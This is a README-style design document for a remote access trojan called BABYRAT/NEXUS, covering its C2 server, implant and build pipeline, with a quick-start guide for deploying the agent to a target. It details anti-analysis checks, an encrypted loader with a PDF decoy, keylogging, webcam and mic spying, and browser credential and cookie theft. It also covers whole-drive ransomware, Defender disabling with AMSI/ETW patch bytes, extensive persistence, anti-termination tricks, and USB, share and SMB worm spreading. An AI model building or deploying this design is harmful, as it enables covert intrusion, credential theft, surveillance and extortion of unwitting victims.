# BABYRAT / NEXUS — Remote Administration & C2 Framework

## Architecture Overview

```
┌──────────────────┐     HTTP/WS      ┌──────────────────┐      WS       ┌──────────────────┐
│   DASHBOARD UI   │ ◄──────────────► │   C2 SERVER      │ ◄───────────► │    AGENT         │
│   (Browser)      │                  │   (server.py)     │               │   (client.py)    │
│   - Node Mesh    │   /ws/viewer/    │   FastAPI+Uvicorn │  /ws/client   │   - Screen cap   │
│   - Remote Shell │   /ws/viewer_cam/│                   │  /ws/client_cam│   - Webcam      │
│   - File Browser │   GET /clients   │   Holds state:    │               │   - Keylogger    │
│   - HID Control  │   GET /stats     │   state.clients{} │               │   - Shell exec   │
│   - Keylogger    │   POST /broadcast│   Viewer sets     │               │   - File ops     │
│   - Credentials  │                  │   per ClientSess. │               │   - Persistence  │
│   - Ransomware   │                  │                   │               │   - Spread/worm  │
└──────┬───────────┘                  └────────┬──────────┘               └──────────────────┘
       │                                      │
       └────── BUILD MANAGER (remote_manager.py) ──────┘
                - Patches IP/port/keys into client.py
                - Obfuscates strings & imports
                - Encrypts client.py into XOR+zlib blob
                - Bundles via PyInstaller into standalone .exe
```

The framework has three main components:
1. **C2 Server** (`server.py`) — FastAPI web server hosting the dashboard UI and WebSocket relay
2. **Agent** (`client.py`) — Remote implant that connects back to the server
3. **Build Manager** (`remote_manager.py`) — Interactive CLI to configure, build, and deploy agents

---

## 1. Build Manager (`remote_manager.py`)

### 1.1 Interactive Menu

Run `remote_manager.py` to open a terminal menu with the following options:

| Option | Config Key | Description |
|--------|-----------|-------------|
| `[1]` | Server IP | C2 listening / agent callback address |
| `[2]` | Server Port | HTTP/WS port (default: 8080) |
| `[P]` | Stream UDP Port | Separate UDP port for screen/audio streaming |
| `[3]` | Output exe name | Name of the generated executable |
| `[4]` | Console window | Show/hide terminal window on target |
| `[5]` | UAC Admin | Request administrator elevation on target |
| `[6]` | Icon file | Custom `.ico` for the executable |
| `[7]` | UPX compress | Compress final executable with UPX (smaller file) |
| `[8]` | Single file | Bundle everything into one `.exe` |
| `[9]` | PDF decoy | Embed a PDF file that opens when agent runs |
| `[0]` | Stealth obfuscation | Enable import obfuscation + dead code injection |

### 1.2 Build Pipeline (`build_agent()`)

```
git checkout client.py (restore clean)
        │
        ▼
  patch_client() — injects SERVER_IP, SERVER_PORT, RSA pubkey, agent name
        │
        ▼
  _obfuscate_client() — renames obfuscation functions, obfuscates imports,
  │                      injects dead code blocks after function definitions
  │                      (only if stealth is enabled)
  │
  ▼
  _encrypt_client_blob("client.py")
  │    - Reads entire client.py as raw bytes
  │    - Compresses with zlib (level 9)
  │    - XOR-encrypts with random 16-byte key + position mixing
  │    - Returns key + encrypted byte list
  │
  ▼
  Generates client_loader.py from ENCRYPTED_LOADER_TEMPLATE
  │    - Embeds the encrypted blob as a Python list literal
  │    - Embeds the XOR key as hex string
  │    - Includes anti-debug checks + decryption + exec stub
  │
  ▼
  generate_spec("client_loader.py")
  │    - Creates PyInstaller .spec with:
  │      - optimize=2 (strip docstrings + asserts)
  │      - strip=True (remove debug symbols)
  │      - UAC manifest if enabled
  │      - Custom icon
  │      - PDF decoy as data file
  │      - 60+ unnecessary modules excluded (tkinter, unittest, email, etc.)
  │
  ▼
  Adds Defender exclusion for build/ and dist/ directories
  │
  ▼
  Runs: pyinstaller --noconfirm --clean build_<name>.spec
  │    (1200-second timeout)
  │
  ▼
  Output: dist/<name>.exe
```

### 1.3 Key Generation (`_generate_agent_keys()`)

Generates an RSA-2048 keypair using `pycryptodome`:
- **Public key** → embedded into the agent at compile time (used for file encryption)
- **Private key** → saved to `keys/<name>/private.pem` on the server (for decryption/unlock)

### 1.4 Loader Template (`ENCRYPTED_LOADER_TEMPLATE`)

The loader is the true entry point of the executable. It:

**Phase 1 — Anti-Debug:**
1. Calls `kernel32.IsDebuggerPresent()` — exits if a debugger is attached
2. Calls `NtQueryInformationProcess(ProcessDebugPort=7)` — if debug port is detected, sleeps 10s then exits
3. Counts physical drives C:, D:, E: — if fewer than 2 exist, exits (catches sandboxes/VMs with minimal drives)

**Phase 2 — PDF Decoy:**
- Locates embedded PDF via `sys._MEIPASS` (PyInstaller temp dir) or script directory
- Opens it with the OS default handler (`os.startfile` on Windows, `xdg-open` on Linux)

**Phase 3 — Decryption + Execution:**
1. Decodes XOR key from hex string via `bytes.fromhex()`
2. XOR-decrypts the blob: `encrypted[i] ^ key[i % 16] ^ (i & 0xFF)`
3. Decompresses with `zlib.decompress()`
4. Compiles and `exec()` the decompressed Python code into global namespace
5. Calls `enhanced_install_persistence()` — activates all persistence mechanisms
6. Calls `check_lock_state()` — if the target was previously ransomware-locked, re-locks immediately
7. Runs `main()` via `asyncio.new_event_loop()`

The entire agent logic is **never on disk as plaintext** — it exists only as an XOR-encrypted, zlib-compressed blob inside the PE file.

---

## 2. C2 Server (`server.py`)

### 2.1 Server Lifecycle

```
Start → FastAPI listens on HOST:PORT
          │
          ▼
    HTTP GET /  → serves DASHBOARD HTML (full UI in one page)
    HTTP GET /clients → returns dict of connected agents
    WebSocket /ws/client → agent control channel
    WebSocket /ws → legacy agent channel
    WebSocket /ws/client_cam → agent camera stream
    WebSocket /ws/viewer/{id} → dashboard attaches to agent
    WebSocket /ws/viewer_cam/{id} → dashboard webcam viewer
```

### 2.2 Agent Connection Flow

```
Agent connects via WebSocket → /ws/client or /ws
        │
        ▼
  Server accepts WebSocket
        │
        ▼
  Agent sends: { "cmd": 0x4B (CMD_REG), "data": { "id": "<UUID>", "hostname": "...", "os": "...", "res": {...} } }
        │
        ▼
  Server creates ClientSession(ws, info) and stores in state.clients[device_id]
        │
        ▼
  Server logs "✅ Node registered: <hostname> (<id_prefix>)"
        │
        ▼
  Dashboard polls GET /clients every 3 seconds — agent now visible in NODE MESH
```

### 2.3 Command Flow (Dashboard → Agent)

```
Dashboard UI action (click/keystroke/etc.)
        │
        ▼
  JavaScript: snd({ cmd: <int>, args: { ... } })
        │
        ▼
  ws.send(JSON.stringify(...)) on viewer WebSocket (/ws/viewer/{device_id})
        │
        ▼
  Server receives text at ws_viewer() handler
        │
        ▼
  Server forwards to agent via session.agent_send_text()
        │
        ▼
  Agent recv_loop() parses JSON, dispatches to command handler
        │
        ▼
  Agent executes action, sends response back via WebSocket
        │
        ▼
  Server receives response at _handle_agent_ws() handler
        │
        ▼
  Server fans-out to all connected viewers via session.broadcast_bytes()/broadcast_text()
        │
        ▼
  Dashboard's onMsg() handles the response:
    - Bytes (0x01 prefix) → JPEG frame → canvas rendering
    - Text { cmd: 0x0F, data: { out: "..." } } → terminal output
    - Text { cmd: 0x11, data: { items: [...] } } → file explorer listing
    - Text { cmd: 0x13, data: { name: "...", bytes: "..." } } → file download
    - Text { cmd: 0x0C, data: "..." } → keylogger buffer
    - Text { cmd: 0x30/0x32, data: "..." } → credential vault display
```

### 2.4 Server State Model

```python
class ServerState:
    clients = {}  # device_id → ClientSession

class ClientSession:
    ws: WebSocket              # Agent control channel
    info: dict                 # Registration data (id, hostname, os, res, etc.)
    viewers: set[WebSocket]    # Dashboard browser tabs viewing this agent
    cam_viewers: set[WebSocket]# Dashboard tabs viewing webcam
    camera_ws: WebSocket       # Agent's camera sub-channel
    last_seen: float           # Timestamp of last activity
    created: float             # Timestamp of initial connection

    async agent_send_bytes(data)    # Send to agent (locked)
    async agent_send_text(text)     # Send to agent (locked)
    async broadcast_bytes(payload)  # Fan-out to all viewers
    async broadcast_text(data)      # Fan-out text to all viewers
```

---

## 3. Agent (`client.py`) — Complete Feature Catalog

### 3.1 Remote Desktop Streaming

**Protocol:** Raw binary over WebSocket (UDP fallback on port 1000)
**Method:** `stream_loop()` captures screen via `mss` (MSS/Mac OS X Screen Shot)
**Adaptive Quality:**
- JPEG quality ranges from 15 (HID activity detected) to 85 (idle)
- Frame interval adapts: 20ms (fast) to 250ms (slow) based on encode/send time
- MD5 frame diffing: skips encode/send if screen content is unchanged
- HID activity within 0.5s drops quality to 15 and slows frame rate
**Binary format:** `[0x01][JPEG bytes]`
**UDP frame format:** `[device_id ASCII][sequence 4B LE][frame_type 1B][num_frags 1B][frag_idx 1B][payload]`

### 3.2 Webcam Streaming

**Method:** `camera_loop()` uses OpenCV (`cv2.VideoCapture`) with DirectShow preference on Windows
- Targets ~28 FPS
- Camera stays open between captures for stable LED behavior (stays ON)
- Closes after ~6 idle ticks (0.48s) to save resources
- Sends on BOTH main stream channel and dedicated camera WebSocket (`/ws/client_cam`)
**Binary format:** `[0x01][JPEG bytes @ quality 50]`

### 3.3 Shell Execution (CMD_SHELL — 0x0F)

**Args:** `{ "cmd": "...", "shellId": "side"|"pop", "cwd": "..." }`
**Method:** `_run_shell_sync()` tries multiple backends:
1. **cmd.exe** for simple commands (dir, cd, echo, type, copy, del, ren, move, cls, ver, help, time, date, md, rd, set) — detected by checking if the command is in a simple-command list
2. **cmd.exe** with path quoting for executable paths containing spaces
3. **PowerShell** fallback via `_run_powershell_sync()` using `-EncodedCommand`
- If `cwd` is provided, validates directory exists before execution
- `shellId="pop"` uses 90s timeout; `"side"` uses 120s timeout
- Sends immediate `{"status": "running"}` response for live dashboard feedback
- CLIXML output from PowerShell is automatically converted to readable text

### 3.4 File System Operations

**Directory Listing** (CMD_FILE_LS — 0x11):
- Args: `{ "path": "C:\\Users" }` or `"DRIVES"` for drive enumeration
- Returns: `{ "path": "...", "items": [{ "name": "...", "is_dir": bool, "size": int }] }`
- Special value `"DRIVES"` returns all available drive letters (A:\ through Z:\)
- Uses `os.scandir()` for efficient directory traversal

**File Download** (CMD_FILE_DL — 0x13):
- Args: `{ "path": "C:\\target\\file.txt" }`
- Returns: `{ "name": "file.txt", "bytes": "<base64 encoded>" }`
- Reads entire file, base64-encodes, sends as JSON

**File Run** (CMD_FILE_RUN — 0x12):
- Args: `{ "path": "C:\\target\\file.exe" }`
- Opens file with OS default handler via `os.startfile()`

**Run with Arguments** (CMD_RUN_ARGS — 0x43):
- Args: `{ "path": "...", "args": "--silent", "terminal": true }`
- If `terminal=true`: runs via PowerShell `Start-Process -Wait -NoNewWindow`, returns stdout
- If `terminal=false`: launches as detached process via `subprocess.Popen`, returns immediately

### 3.5 HID (Human Interface Device) — Remote Input

**Initialization:** Uses `pynput.mouse.Controller` + `pynput.keyboard.Controller`
**Architecture:** Background thread (`_hid_worker`) processes a thread-safe queue of HID actions

**Mouse Move** (CMD_MOUSE — 0x50):
- Args: `{ "x": 1920, "y": 1080 }`
- Absolute coordinates mapped to remote screen resolution
- Uses `requestAnimationFrame` coalescing (32ms throttle) for smooth streaming

**Mouse Click** (CMD_CLICK — 0x51):
- Args: `{ "btn": "left"|"right", "down": true|false }`
- Presses or releases specified mouse button

**Key Press** (CMD_KEY — 0x52):
- Args: `{ "key": "enter"|"a"|"space"|"ctrl"|"esc" }`
- Supports all `pynput.keyboard.Key` attribute names
- Presses AND releases the key

### 3.6 Audio System

**Capture** (`_ensure_audio()`):
- Backends: `sounddevice` (preferred), `pyaudio` (fallback)
- Configuration: mono, 44100 Hz, 480-frame blocks
- On Windows, prefers loopback-style inputs (Stereo Mix, What U Hear, Wave Out Mix)
- Packet format: `[0x04][samplerate 2B LE][num_samples 2B LE][s16le PCM data]`

**Playback on Target** (CMD_SOUND — 0x60):
- Supports chunked upload: `{ "reset": true, "size": N }` → `{ "b64": "..." }` chunks → `{ "end": true }`
- Also supports single-shot: `{ "bytes": "<b64>", "name": "..." }`
- Max file size: 20 MB
- Playback: WAV uses sounddevice → PyAudio → winsound (fallback)
- Non-WAV saves to temp and opens with OS default handler

**Remote Mic Playback** (from operator to agent):
- Agent receives `[0x03][PCM audio]` binary frames on control WebSocket
- Background thread (`_remote_mic_worker`) feeds audio to PyAudio output
- Sample rate conversion via numpy interpolation

### 3.7 Keylogging

**Control** (CMD_KEYLOG — 0x0C):
- Args: `{ "action": "start"|"stop"|"fetch" }`
- Uses `pynput.keyboard.Listener` to capture ALL keystrokes
- `"start"`: Begins capturing into `_keybuf`
- `"stop"`: Stops the listener
- `"fetch"`: Sends accumulated keystrokes as `{ "cmd": 0x0C, "data": "<keystrokes>" }` and clears buffer

### 3.8 Credential Harvesting

**Browser Passwords** (CMD_VAULT — 0x30):
- Targets: Chrome, Edge, Brave
- Profiles scanned: Default, Profile 1, Profile 2
- Database: `Login Data` (SQLite)
- Decryption:
  1. Reads `Local State` JSON for encrypted key
  2. Decrypts key with `win32crypt.CryptUnprotectData`
  3. Uses AES-GCM to decrypt each password field
  4. Falls back to `CryptUnprotectData` for older Chrome versions
- Returns: `"[Browser] url | username | password"` lines

**Browser Cookies** (CMD_COOKIES — 0x32):
- Targets: Chrome, Edge
- Profiles: Default only
- Database: `Cookies` or `Network\Cookies` (SQLite)
- Same AES-GCM decryption as passwords
- Limit: 200 entries max
- Returns: `"[Browser] host | name=value"` lines

### 3.9 Workstation Lock (CMD_LOCK — 0x20)

**Args:** `{ "password": "1234" }`
**Behavior:**
1. Creates full-screen tkinter window (black background, red text)
2. Disables USB/HID/Keyboard/Mouse via PowerShell `Disable-PnpDevice`
3. Only numeric PIN accepted
4. Escalating lockouts: 3 failed → 2s delay, 5 failed → 10s delay, 10 failed → 60s delay
5. Correct PIN re-enables all devices via `Enable-PnpDevice`
6. Persists lock password in registry (`HKCU\...\LockPin`) and a temp file
7. On agent restart, `check_lock_state()` detects the lock file and re-locks immediately

### 3.10 File Encryption (CMD_ENCRYPT — 0x21)

**Method:** Hybrid RSA-2048 + AES-256-CBC
1. Uses the embedded RSA public key (`_EMBEDDED_PUBKEY`)
2. Generates random 32-byte AES key + 16-byte IV
3. Encrypts AES key with RSA-OAEP (256 bytes output)
4. Encrypts file with AES-256-CBC
5. Output format per file: `[256B RSA-encrypted AES key][16B IV][ciphertext]`
6. Renames original to `.locked`, deletes original
7. If no targets specified, encrypts ALL files on ALL drives recursively

**Decryption** (CMD_DECRYPT — 0x22):
- Requires prior RSA private key injection via `CMD_KEY_INJECT` (0x26)
- Reverses the hybrid encryption: RSA-OAEP decrypt → AES-CBC decrypt
- Strips `.locked` extension, deletes encrypted file

### 3.11 RSA Key Injection (CMD_KEY_INJECT — 0x26)

**Args:** `{ "privkey": "-----BEGIN RSA PRIVATE KEY-----\n..." }`
- Stores the PEM private key in memory (`_stored_privkey`)
- Required BEFORE calling decrypt (0x22) or ransomware unlock (0x25)
- Returns confirmation via shell output channel

### 3.12 Ransomware (CMD_RANSOM — 0x24)

**Full chain:**
1. Encrypts ALL files on ALL drives via `do_encrypt()` (same RSA+AES method)
2. Saves lock state to registry and temp file with `{"type":"ransom","device_id":"...","ts":...}`
3. Launches full-screen ransom note via `_ransom_lock_screen()`:
   - Displays device ID, warning text "YOUR FILES HAVE BEEN ENCRYPTED"
   - Polls every 3 seconds for unlock signal
   - FullScreen tkinter window (no border, topmost)
4. Returns: `"Ransomware deployed. N files encrypted. Device locked."`

**Unlock** (CMD_RANSOM_UNLOCK — 0x25):
- Sets unlock trigger → lock screen polling loop detects it → closes window
- Calls `do_decrypt()` on all drives to restore files
- Clears lock state from registry/filesystem
- Requires: RSA private key must have been injected via `CMD_KEY_INJECT` first

### 3.13 Antivirus Evasion

**Disable Windows Defender** (CMD_DISABLE_DEFENDER — 0x42):

Uses an 8-layer approach:

| Layer | Technique |
|-------|-----------|
| 0 | AMSI/ETW patching — patches `AmsiScanBuffer` in `amsi.dll` to return `E_INVALIDARG`; patches `EtwEventWrite` in `ntdll.dll` to return immediately |
| 1 | Kill Defender processes — `MsMpEng.exe`, `NisSrv.exe`, `SecurityHealthService.exe`, `MsMpEngCPI.exe` |
| 2 | Add exclusion paths — TEMP, APPDATA, LOCALAPPDATA, Desktop; add extension exclusions `.exe`, `.dll`, `.ps1` |
| 3 | Disable real-time monitoring, behavior monitoring, Block at First Seen, IOAV protection, privacy mode, signature updates, archive scanning, intrusion prevention, script scanning |
| 4 | Registry policies under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` |
| 5 | Stop and disable Windows Defender services via `sc config` |
| 6 | WMI preference purging |
| 7 | Additional policies: PUA protection, cloud block level, etc. |

### 3.14 URL Open (CMD_URL — 0x40)

- Args: `{ "url": "https://example.com" }`
- Opens URL in the default browser via `webbrowser.open()`

### 3.15 Download & Execute (CMD_DL_EXE — 0x41)

- Args: `{ "url": "...", "name": "payload.exe", "args": "--silent", "terminal": false }`
- Downloads file to temp directory with random prefix
- Marks file as hidden (`FILE_ATTRIBUTE_HIDDEN`)
- If `terminal=true`: runs via PowerShell `Start-Process -Wait -NoNewWindow`, captures stdout, deletes file after
- If `terminal=false`: launches as detached process, returns immediately

### 3.16 Remote Desktop URL / Silent Downloader (CMD_DL_EXE)

Part of the dashboard System menu. See 3.15 above for agent logic.

---

## 4. Persistence & Evasion Engine ("Immortality Suite")

Activated at agent startup via `enhanced_install_persistence()` → `_immortality_init()`:

### 4.1 AMSI/ETW Patching
- `AmsiScanBuffer` → return `0x80070057` (E_INVALIDARG) immediately
- `EtwEventWrite` → return immediately (`ret`)
- Technique: `VirtualProtect` + write `\x31\xC0\xC3` (xor eax, eax; ret)

### 4.2 Mutex Singleton
- Creates `Global\WinSvcUpdate_<device_id_prefix>` to prevent multiple instances
- Does not block if mutex creation fails (allows multi-instance if needed)

### 4.3 PowerShell Watchdog
- Spawns hidden PowerShell process that polls agent PID every 3 seconds
- If agent process dies, PowerShell re-launches it from the same executable path

### 4.4 Registry Persistence (5+ locations)

| Key Type | Path |
|----------|------|
| HKCU Run | `Software\Microsoft\Windows\CurrentVersion\Run` — obfuscated key name |
| HKCU RunOnce | Same path, named "WinSvcUpd" |
| HKLM Run | `Software\Microsoft\Windows\CurrentVersion\Run` — "WindowsServiceUpdate" |
| HKLM RunOnce | Same path, "WinSvcUpd" |
| HKLM Winlogon | `Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` — appends after `userinit.exe,` |

### 4.5 Windows Service
- Creates service with obfuscated name, `start=auto`
- Configures recovery: restart after 30s, 60s, 90s (3 failures)
- Sets obfuscated description

### 4.6 WMI Event Subscription (Fileless)
- Creates `__EventFilter` triggered by performance counter modification every 300 seconds
- Creates `CommandLineEventConsumer` that re-launches agent
- Links filter to consumer via `__FilterToConsumerBinding`
- No files written to disk

### 4.7 Scheduled Tasks (4 triggers)

| Task Suffix | Trigger | Privileges |
|-------------|---------|------------|
| (onlogon) | At user logon | Highest |
| (minute) | Every 5 minutes | Highest |
| (onstart) | System start | Highest |
| (onidle) | 10 minutes idle | Highest |

### 4.8 VBScript Masquerade
- Writes VBScript to temp directory that launches agent
- Runs via `wscript.exe //B` (trusted Microsoft binary with signed certificate)

### 4.9 Handle Revocation (Anti-Termination)
- Background thread using `NtQuerySystemInformation(SystemHandleInformation)` to enumerate all open handles system-wide
- Closes handles pointing to agent's PID from other processes using `DuplicateHandle` with `DUPLICATE_CLOSE_SOURCE`
- Prevents Process Hacker, Task Manager, etc. from killing the process

### 4.10 Dead Man's Switch
- Writes heartbeat timestamp to `HKCU\Software\WinSvcUpdate\Heartbeat` every 300 seconds
- Creates scheduled task "WinSvcHeartbeatCheck" running every 10 minutes
- If heartbeat is older than 600 seconds, re-launches agent

### 4.11 NTFS ADS Hiding
- Copies agent executable into NTFS Alternate Data Stream of trusted files: `calc.exe`, `notepad.exe`, `explorer.exe`
- Creates registry Run entry to execute from ADS via `cmd.exe /c start <path>:WinSvcUpdate.exe`

### 4.12 Hidden Copies (5 locations)
- Copies executable to: APPDATA, LOCALAPPDATA, TEMP, USERPROFILE, `APPDATA\Microsoft`
- Each copy is hidden with `attrib +h`
- Each copy registered in HKCU Run as `WinSvcCopy0` through `WinSvcCopy4`

### 4.13 Mutual Watchdog
- Each hidden copy monitors the others every 60 seconds
- If any copy is missing from disk, re-deploys it from the current executable

---

## 5. Worm / Self-Replication Engine

### 5.1 USB Spreader (`_usb_spreader_loop`)

Polls every 5 seconds for removable drives (`GetDriveTypeW == DRIVE_REMOVABLE`):

1. **Copies itself** to USB root as hidden+system file via `SetFileAttributesW`
2. **Creates `autorun.inf`** with `open=WinSvcUpdate.exe` and `shell\open\command` entries
3. **Creates fake folder shortcut** — a `ReadMe.lnk` with folder icon (`shell32.dll,1`), with `TargetPath` pointing to the copied agent
4. **Hides real files** — creates a `Documents\` folder (hidden), moves ALL existing files into it, so the drive appears empty except for the folder-looking `ReadMe.lnk`
5. Marks drive as "infected" and skips it on subsequent polls

**Result:** Victim sees an almost-empty USB drive with one folder-looking shortcut. Clicking it runs the agent.

### 5.2 Network Share Spreader (`_network_share_spreader`)

- Calls `net view /all` to enumerate network computers
- Parses writable disk shares (excludes `print$`, `ipc$`, `admin$`)
- Copies agent via PowerShell `Copy-Item`
- Creates remote scheduled task to run the agent on each target

### 5.3 LAN Worm (`_lan_worm_scan`)

- Determines local subnet from local IP
- Scans `.0/24` on port 445 (SMB) with 0.5s timeout per host
- For each open SMB host:
  - Copies agent to `ADMIN$` share via PowerShell
  - Creates remote scheduled task via `schtasks /create /s <ip>` with `onlogon` + `every 15 min` triggers

### 5.4 Spreader Activation

All spreaders start as daemon threads when `_spreader_init()` is called during `_immortality_init()`:
```python
threading.Thread(target=_usb_spreader_loop, daemon=True).start()
threading.Thread(target=_network_share_spreader, daemon=True).start()
threading.Thread(target=_lan_worm_scan, daemon=True).start()
```

---

## 6. Dashboard UI Features

### 6.1 Node Mesh (Sidebar)

- Polls `GET /clients` every 3 seconds via `sync()`
- Displays each connected agent with hostname, OS, and online indicator
- Click to select → connects viewer WebSocket → begins screen streaming
- Status bar shows connection state

### 6.2 Remote Desktop (Canvas)

- Real-time JPEG frame rendering on HTML5 Canvas
- Crosshair cursor for mouse position
- Mouse click captured relative to canvas → normalized to remote resolution → sent as absolute coords
- Keyboard input captured when canvas is focused → sent as key press events
- Resolution detection: initial `tres` from agent registration, updated on first frame

### 6.3 Remote Shell

**Side Terminal** (`#term`):
- PS>` input box sends command with `{cmd: 0x0F, args: {cmd, shellId: "side"}}`
- Command history via Up/Down arrow keys
- Ctrl+L clears terminal, Ctrl+C sends interrupt marker
- Output appended in real-time as agent responds

**Popup Folder Terminal** (`#termm`):
- Opens from file explorer via "PS here" or "💻 PS" button
- Automatically sets `cwd` to the remote folder path
- Same history, clear, interrupt features as side terminal
- Independent history array from side terminal

### 6.4 File Explorer (`#fem`)

- `nav("DRIVES")` → lists all drive letters
- Click folder → `nav(path)` → lists directory contents sorted: folders first, then files alphabetically
- Per-file buttons:
  - **⬇ DL** — downloads file via `{cmd: 0x13}`, triggers browser download
  - **▶ RUN** — opens with OS default handler via `{cmd: 0x12}`
  - **⚙️ ARGS** — opens "Run with Arguments" dialog, uses `{cmd: 0x43}` for terminal/detached modes
  - **🔒 Lock** — encrypts individual file via `{cmd: 0x21}`
  - **🔓 Decrypt** — decrypts individual file via `{cmd: 0x22}`
  - **💻 PS** (on folders) — opens popup terminal in that folder

### 6.5 Keylogger (`#klm`)

- Start/Stop/Fetch buttons
- Accumulated keystrokes displayed in a monospace `<pre>` block
- Green text on dark background

### 6.6 Credential Vault (`#vm`)

- Receives harvested passwords/cookies data
- Displays in monospace `<pre>` block

### 6.7 RSA Key Injection (`#keym`)

- Textarea for pasting PEM-formatted RSA private key
- Sends key to agent via `{cmd: 0x26}`
- Required before decryption or ransomware unlock

### 6.8 URL Injector (`#urlm`)

- Text input for URL
- Sends `{cmd: 0x40, args: {url}}` to agent
- Opens URL in target's default browser

### 6.9 Silent Downloader (`#dlm`)

- Text input for download URL
- Sends `{cmd: 0x41, args: {url}}` for download + execute

### 6.10 Sound Injector (`#sndm`)

- File input for audio file selection
- Chunks file (24KB raw chunks), streams via `{cmd: 0x60}` protocol
- Reassembled and played on target

### 6.11 Desktop/Webcam View Pills

- **🖥 Desktop** — `sw('screen')`: switches canvas to screen capture
- **📹 Webcam** — `sw('cam')`: switches canvas to webcam feed
- **🌐 Webcam Tab** — `openCamTab()`: opens webcam in separate browser tab
- **🔊 Audio** — `toggleAudio()`: toggles audio streaming from agent
- **🎙 Mic** — `toggleMic()`: toggles microphone capture from operator
- **🔴 RECORD** — `toggleRec()`: records canvas to WebM (appears after selecting a node)

---

## 7. HTTP API Reference

| Method | Route | Description | Returns |
|--------|-------|-------------|---------|
| GET | `/` | Dashboard HTML | text/html |
| GET | `/clients` | All connected agents | `{device_id: info, ...}` |
| GET | `/stats` | Server statistics | JSON with client details |
| GET | `/server_logs?lines=100` | Last N log lines | text/plain |
| GET | `/network_config` | Server config | JSON |
| GET | `/test` | Health check | JSON |
| POST | `/network_config` | Update config | JSON |
| POST | `/broadcast` | Send command to all agents | JSON |
| POST | `/build_client` | Build agent via PyInstaller | text/plain |
| GET | `/broadcast_results` | Last broadcast output | JSON |

---

## 8. WebSocket Protocol Reference

### Agent Registration
```json
// Agent → Server
{ "cmd": 75, "data": { "id": "<UUID>", "hostname": "...", "os": "...", "res": {"w": 1920, "h": 1080}, "agent_name": "english", "is_admin": true } }
```

### Command Format (Dashboard → Agent)
```json
{ "cmd": <int>, "args": { ... } }
```

### Response Format (Agent → Dashboard)
```json
{ "cmd": <int>, "data": { ... } }
```

### Binary Stream Format
- `0x01` + JPEG bytes: Screen/webcam frame
- `0x02` + WAV bytes: Audio playback
- `0x03` + PCM audio: Live microphone feed
- `0x04` + PCM header+data: Audio capture packet

### Keep-Alive
```json
// Every 5s from viewer; every 22s from agent
{ "cmd": 126, "args": {} }
```

---

## 9. Supporting Files

| File | Purpose |
|------|---------|
| `dashboard_host.py` | Desktop host: starts server + opens browser/WebView2 |
| `build.py` | Simple one-shot PyInstaller build script |
| `hide.py` | Batch-file launcher creator (no PyInstaller needed) |
| `wrapper.py` | Minimal PyInstaller wrapper: opens PDF + launches agent in TEMP |
| `lockerprotector.py` | Standalone screen locker + RSA/AES encryptor |
| `unlock.py` | AES-CBC decryption utility (reads key from env var) |

---

## 10. Configuration Files

| File | Format | Purpose |
|------|--------|---------|
| `manager_config.json` | JSON | Build options persistence |
| `network_config.json` | JSON | Server bind/client target addresses |
| `keys/<name>/private.pem` | PEM | Per-agent RSA-2048 private key |
| `keys/<name>/public.pem` | PEM | Public key embedded in agent |
| `server.log` | Text | C2 server activity log |

---

## 11. Quick Usage

```bash
# 1. Start the build manager
python remote_manager.py

# 2. Configure agent (set IP, port, name, toggles)
#    Press [S] to start C2 server
#    Press [B] to build the agent executable

# 3. Or build from CLI:
python remote_manager.py --build 10.0.0.5:8080 --name agent --stealth --uac

# 4. Deploy dist/agent.exe to the target
#    On execution, agent connects back to the server

# 5. Open http://SERVER_IP:PORT in a browser
#    The agent appears in the NODE MESH sidebar
#    Click to interact: shell, file browser, keylogger, screen view, etc.
```
